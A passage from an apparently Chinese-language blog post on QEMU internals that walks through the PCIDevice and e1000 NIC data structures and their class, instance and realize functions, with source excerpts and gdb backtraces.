class="line"><span class="comment">     */</span></span><br><span class="line">    NamedGPIOListHead gpios;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @clocks: QLIST of named clocks the device provides.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NamedClockListHead clocks;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @child_bus: QLIST of child buses</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusStateHead child_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @num_child_bus: number of @child_bus entries</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> num_child_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @instance_id_alias: device alias for handling legacy migration setups</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> instance_id_alias;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @alias_required_for_version: indicates @instance_id_alias is</span></span><br><span class="line"><span class="comment">     * needed for migration</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> alias_required_for_version;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @reset: ResettableState for the device; handled by Resettable interface.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ResettableState reset;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @unplug_blockers: list of reasons to block unplugging of device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    GSList *unplug_blockers;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @mem_reentrancy_guard: Is the device currently in mmio/pio/dma?</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Used to prevent re-entrancy confusing things.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MemReentrancyGuard mem_reentrancy_guard;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    <span class="type">bool</span> partially_hotplugged;</span><br><span class="line">    <span class="type">bool</span> has_power;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI config space */</span></span><br><span class="line">    <span class="type">uint8_t</span> *config;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Used to enable config checks on load. Note that writable bits are</span></span><br><span class="line"><span class="comment">     * never checked even if set in cmask.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint8_t</span> *cmask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to implement R/W bytes */</span></span><br><span class="line">    <span class="type">uint8_t</span> *wmask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to implement RW1C(Write 1 to Clear) bytes */</span></span><br><span class="line">    <span class="type">uint8_t</span> *w1cmask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to allocate config space for capabilities. */</span></span><br><span class="line">    <span class="type">uint8_t</span> *used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the following fields are read only */</span></span><br><span class="line">    <span class="type">int32_t</span> devfn;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Cached device to fetch requester ID from, to avoid the PCI tree</span></span><br><span class="line"><span class="comment">     * walking every time we invoke PCI request (e.g., MSI). For</span></span><br><span class="line"><span class="comment">     * conventional PCI root complex, this field is meaningless.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PCIReqIDCache requester_id_cache;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    PCIIORegion io_regions[PCI_NUM_REGIONS];</span><br><span class="line">    AddressSpace bus_master_as;</span><br><span class="line">    MemoryRegion bus_master_container_region;</span><br><span class="line">    MemoryRegion bus_master_enable_region;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do not access the following fields */</span></span><br><span class="line">    PCIConfigReadFunc *config_read;</span><br><span class="line">    PCIConfigWriteFunc *config_write;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Legacy PCI VGA regions */</span></span><br><span class="line">    MemoryRegion *vga_regions[QEMU_PCI_VGA_NUM_REGIONS];</span><br><span class="line">    <span class="type">bool</span> has_vga;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Current IRQ levels.  Used internally by the generic PCI code.  */</span></span><br><span class="line">    <span class="type">uint8_t</span> irq_state;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Capability bits */</span></span><br><span class="line">    <span class="type">uint32_t</span> cap_present;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Offset of MSI-X capability in config space */</span></span><br><span class="line">    <span class="type">uint8_t</span> msix_cap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSI-X entries */</span></span><br><span class="line">    <span class="type">int</span> msix_entries_nr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Space to store MSIX table &amp; pending bit array */</span></span><br><span class="line">    <span class="type">uint8_t</span> *msix_table;</span><br><span class="line">    <span class="type">uint8_t</span> *msix_pba;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* May be used by INTx or MSI during interrupt notification */</span></span><br><span class="line">    <span class="type">void</span> *irq_opaque;</span><br><span class="line"></span><br><span class="line">    MSITriggerFunc *msi_trigger;</span><br><span class="line">    MSIPrepareMessageFunc *msi_prepare_message;</span><br><span class="line">    MSIxPrepareMessageFunc *msix_prepare_message;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MemoryRegion container for msix exclusive BAR setup */</span></span><br><span class="line">    MemoryRegion msix_exclusive_bar;</span><br><span class="line">    <span class="comment">/* Memory Regions for MSIX table and pending bit entries. */</span></span><br><span class="line">    MemoryRegion msix_table_mmio;</span><br><span class="line">    MemoryRegion msix_pba_mmio;</span><br><span class="line">    <span class="comment">/* Reference-count for entries actually in use by driver. */</span></span><br><span class="line">    <span class="type">unsigned</span> *msix_entry_used;</span><br><span class="line">    <span class="comment">/* MSIX function mask set or MSIX disabled */</span></span><br><span class="line">    <span class="type">bool</span> msix_function_masked;</span><br><span class="line">    <span class="comment">/* Version id needed for VMState */</span></span><br><span class="line">    <span class="type">int32_t</span> version_id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Offset of MSI capability in config space */</span></span><br><span class="line">    <span class="type">uint8_t</span> msi_cap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI Express */</span></span><br><span class="line">    PCIExpressDevice <span class="built_in">exp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* SHPC */</span></span><br><span class="line">    SHPCDevice *shpc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Location of option rom */</span></span><br><span class="line">    <span class="type">char</span> *romfile;</span><br><span class="line">    <span class="type">uint32_t</span> romsize;</span><br><span class="line">    <span class="type">bool</span> has_rom;</span><br><span class="line">    MemoryRegion rom;</span><br><span class="line">    <span class="type">uint32_t</span> rom_bar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* INTx routing notifier */</span></span><br><span class="line">    PCIINTxRoutingNotifier intx_routing_notifier;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSI-X notifiers */</span></span><br><span class="line">    MSIVectorUseNotifier msix_vector_use_notifier;</span><br><span class="line">    MSIVectorReleaseNotifier msix_vector_release_notifier;</span><br><span class="line">    MSIVectorPollNotifier msix_vector_poll_notifier;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ID of standby device in net_failover pair */</span></span><br><span class="line">    <span class="type">char</span> *failover_pair_id;</span><br><span class="line">    <span class="type">uint32_t</span> acpi_index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * HW models:</span></span><br><span class="line"><span class="comment"> *  E1000_DEV_ID_82540EM works with Windows, Linux, and OS X &lt;= 10.8</span></span><br><span class="line"><span class="comment"> *  E1000_DEV_ID_82544GC_COPPER appears to work; not well tested</span></span><br><span class="line"><span class="comment"> *  E1000_DEV_ID_82545EM_COPPER works with Linux and OS X &gt;= 10.6</span></span><br><span class="line"><span class="comment"> *  Others never tested</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">E1000State_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion io;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> mac_reg[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="type">uint16_t</span> phy_reg[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">uint16_t</span> eeprom_data[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> rxbuf_size;</span><br><span class="line">    <span class="type">uint32_t</span> rxbuf_min_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">e1000_tx</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> header[<span class="number">256</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> vlan_header[<span class="number">4</span>];</span><br><span class="line">        <span class="comment">/* Fields vlan and data must not be reordered or separated. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> vlan[<span class="number">4</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0x10000</span>];</span><br><span class="line">        <span class="type">uint16_t</span> size;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> vlan_needed;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> sum_needed;</span><br><span class="line">        <span class="type">bool</span> cptse;</span><br><span class="line">        e1000x_txd_props props;</span><br><span class="line">        e1000x_txd_props tso_props;</span><br><span class="line">        <span class="type">uint16_t</span> tso_frames;</span><br><span class="line">        <span class="type">bool</span> busy;</span><br><span class="line">    &#125; tx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span> val_in;    <span class="comment">/* shifted in from guest driver */</span></span><br><span class="line">        <span class="type">uint16_t</span> bitnum_in;</span><br><span class="line">        <span class="type">uint16_t</span> bitnum_out;</span><br><span class="line">        <span class="type">uint16_t</span> reading;</span><br><span class="line">        <span class="type">uint32_t</span> old_eecd;</span><br><span class="line">    &#125; eecd_state;</span><br><span class="line"></span><br><span class="line">    QEMUTimer *autoneg_timer;</span><br><span class="line"></span><br><span class="line">    QEMUTimer *mit_timer;      <span class="comment">/* Mitigation timer. */</span></span><br><span class="line">    <span class="type">bool</span> mit_timer_on;         <span class="comment">/* Mitigation timer is running. */</span></span><br><span class="line">    <span class="type">bool</span> mit_irq_level;        <span class="comment">/* Tracks interrupt pin level. */</span></span><br><span class="line">    <span class="type">uint32_t</span> mit_ide;          <span class="comment">/* Tracks E1000_TXD_CMD_IDE bit. */</span></span><br><span class="line"></span><br><span class="line">    QEMUTimer *flush_queue_timer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compatibility flags for migration to/from qemu 1.3.0 and older */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_MAC_BIT 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_TSO_BIT 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_VET_BIT 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_MAC (1 &lt;&lt; E1000_FLAG_MAC_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_TSO (1 &lt;&lt; E1000_FLAG_TSO_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E1000_FLAG_VET (1 &lt;&lt; E1000_FLAG_VET_BIT)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> compat_flags;</span><br><span class="line">    <span class="type">bool</span> received_tx_tso;</span><br><span class="line">    <span class="type">bool</span> use_tso_for_migration;</span><br><span class="line">    e1000x_txd_props mig_props;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其<strong>mmio</strong>和<strong>io</strong>的MemoryRegion就是前面<a href="#PCI配置空间">pci配置空间</a>中的<strong>BAR</strong>，其<strong>parent_obj</strong>中的<strong>config</strong>则是前面<a href="#PCI配置空间">pci配置空间</a>的配置头</p><h3 id="初始化-2"><a href="#初始化-2" class="headerlink" title="初始化"></a>初始化</h3><h4 id="类初始化-1"><a href="#类初始化-1" class="headerlink" title="类初始化"></a>类初始化</h4><p><strong>e1000</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1698"><strong>e1000_class_init()</strong></a>初始化类<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  e1000_class_init (klass=0x555557242140, data=0x555556dfa710 &lt;e1000_devices+16&gt;) at ../../qemu/hw/net/e1000.c:1700</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea306a in type_initialize (ti=0x55555709bfc0) at ../../qemu/qom/object.c:418</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea4a1d in object_class_foreach_tramp (key=0x55555709c140, value=0x55555709bfc0, opaque=0x7fffffffd7a0) at ../../qemu/qom/object.c:1133</span></span><br><span class="line"><span class="comment">//#3  0x00007ffff7b6c6b8 in g_hash_table_foreach () at /lib/x86_64-linux-gnu/libglib-2.0.so.0</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea4b0d in object_class_foreach (fn=0x555555ea4c98 &lt;object_class_get_list_tramp&gt;, implements_type=0x555556279512 &quot;machine&quot;, include_abstract=false, opaque=0x7fffffffd7f0) at ../../qemu/qom/object.c:1155</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea4d26 in object_class_get_list (implements_type=0x555556279512 &quot;machine&quot;, include_abstract=false) at ../../qemu/qom/object.c:1212</span></span><br><span class="line"><span class="comment">//#6  0x0000555555bd9434 in select_machine (qdict=0x5555570ebce0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1661</span></span><br><span class="line"><span class="comment">//#7  0x0000555555bda5fd in qemu_create_machine (qdict=0x5555570ebce0) at ../../qemu/system/vl.c:2101</span></span><br><span class="line"><span class="comment">//#8  0x0000555555bde7b1 in qemu_init (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/vl.c:3664</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e96f93 in main (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#10 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffdb58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#11 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffdb58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdb48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#12 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">e1000_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">    E1000BaseClass *e = E1000_CLASS(klass);</span><br><span class="line">    <span class="type">const</span> E1000Info *info = data;</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_e1000_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span> = pci_e1000_uninit;</span><br><span class="line">    k-&gt;romfile = <span class="string">&quot;efi-e1000.rom&quot;</span>;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_INTEL;</span><br><span class="line">    k-&gt;device_id = info-&gt;device_id;</span><br><span class="line">    k-&gt;revision = info-&gt;revision;</span><br><span class="line">    e-&gt;phy_id2 = info-&gt;phy_id2;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_NETWORK_ETHERNET;</span><br><span class="line">    rc-&gt;phases.hold = e1000_reset_hold;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_NETWORK, dc-&gt;categories);</span><br><span class="line">    dc-&gt;desc = <span class="string">&quot;Intel Gigabit Ethernet&quot;</span>;</span><br><span class="line">    dc-&gt;vmsd = &amp;vmstate_e1000;</span><br><span class="line">    device_class_set_props(dc, e1000_properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，其在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1148"><strong>object_class_foreach()</strong></a>初始化所有注册的类时，初始化了<strong>PCIDeviceClass</strong>父类相关字段，并设置了实例化函数指针。</p><h4 id="对象初始化-2"><a href="#对象初始化-2" class="headerlink" title="对象初始化"></a>对象初始化</h4><p>根据前面<a href="#数据结构-2">数据结构</a>，虽然<strong>e1000</strong>的<strong>struct TypeInfo</strong>并未设置对象初始化函数，但<strong>QOM</strong>会使用其父类的对象初始化函数<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1721">e1000_instance_init()</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  e1000_instance_init (obj=0x5555580d01f0) at ../../qemu/hw/net/e1000.c:1723</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea30e0 in object_init_with_type (obj=0x5555580d01f0, ti=0x55555709bc20) at ../../qemu/qom/object.c:429</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea30c2 in object_init_with_type (obj=0x5555580d01f0, ti=0x55555709be00) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea36a6 in object_initialize_with_type (obj=0x5555580d01f0, size=208592, type=0x55555709be00) at ../../qemu/qom/object.c:571</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea3e75 in object_new_with_type (type=0x55555709be00) at ../../qemu/qom/object.c:791</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea3ee1 in object_new (typename=0x5555580c2180 &quot;e1000&quot;) at ../../qemu/qom/object.c:806</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e9b710 in qdev_new (name=0x5555580c2180 &quot;e1000&quot;) at ../../qemu/hw/core/qdev.c:166</span></span><br><span class="line"><span class="comment">//#7  0x0000555555bcdd84 in qdev_device_add_from_qdict (opts=0x5555580c2500, from_json=false, errp=0x7fffffffd710) at ../../qemu/system/qdev-monitor.c:681</span></span><br><span class="line"><span class="comment">//#8  0x0000555555bcdf99 in qdev_device_add (opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#9  0x0000555555bd80a7 in device_init_func (opaque=0x0, opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#10 0x00005555560be1e2 in qemu_opts_foreach (list=0x555556f4bec0 &lt;qemu_device_opts&gt;, func=0x555555bd807c &lt;device_init_func&gt;, opaque=0x0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#11 0x0000555555bdbd46 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bdbf8c in qmp_x_exit_preconfig (errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#13 0x0000555555bde944 in qemu_init (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e96f93 in main (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#15 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffdb58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#16 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffdb58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdb48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#17 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">e1000_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    E1000State *n = E1000(obj);</span><br><span class="line">    device_add_bootindex_property(obj, &amp;n-&gt;conf.bootindex,</span><br><span class="line">                                  <span class="string">&quot;bootindex&quot;</span>, <span class="string">&quot;/ethernet-phy@0&quot;</span>,</span><br><span class="line">                                  DEVICE(n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其在解析Qemu参数时初始化<strong>e1000</strong>对象，其中没有过多的<strong>PCI设备</strong>相关的信息，这些被放到了实例化中进行</p><h3 id="实例化-1"><a href="#实例化-1" class="headerlink" title="实例化"></a>实例化</h3><p>根据前面<a href="#类初始化-1">类初始化</a>内容，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1637">pci_e1000_realize()</a>函数来实例化<strong>e1000</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_e1000_realize (pci_dev=0x5555580d01f0, errp=0x7fffffffd420) at ../../qemu/hw/net/e1000.c:1639</span></span><br><span class="line"><span class="comment">//#1  0x0000555555a9a921 in pci_qdev_realize (qdev=0x5555580d01f0, errp=0x7fffffffd4a0) at ../../qemu/hw/pci/pci.c:2093</span></span><br><span class="line"><span class="comment">//#2  0x0000555555e9c4f4 in device_set_realized (obj=0x5555580d01f0, value=true, errp=0x7fffffffd710) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea7cfb in property_set_bool (obj=0x5555580d01f0, v=0x5555580c5590, name=0x5555562f9dd1 &quot;realized&quot;, opaque=0x5555570f4510, errp=0x7fffffffd710) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea5891 in object_property_set (obj=0x5555580d01f0, name=0x5555562f9dd1 &quot;realized&quot;, v=0x5555580c5590, errp=0x7fffffffd710) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#5  0x0000555555eaa4ca in object_property_set_qobject (obj=0x5555580d01f0, name=0x5555562f9dd1 &quot;realized&quot;, value=0x5555580c35d0, errp=0x7fffffffd710) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#6  0x0000555555ea5c4a in object_property_set_bool (obj=0x5555580d01f0, name=0x5555562f9dd1 &quot;realized&quot;, value=true, errp=0x7fffffffd710) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e9bc0e in qdev_realize (dev=0x5555580d01f0, bus=0x5555574157d0, errp=0x7fffffffd710) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#8  0x0000555555bcdee9 in qdev_device_add_from_qdict (opts=0x5555580c2500, from_json=false, errp=0x7fffffffd710) at ../../qemu/system/qdev-monitor.c:718</span></span><br><span class="line"><span class="comment">//#9  0x0000555555bcdf99 in qdev_device_add (opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#10 0x0000555555bd80a7 in device_init_func (opaque=0x0, opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#11 0x00005555560be1e2 in qemu_opts_foreach (list=0x555556f4bec0 &lt;qemu_device_opts&gt;, func=0x555555bd807c &lt;device_init_func&gt;, opaque=0x0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bdbd46 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#13 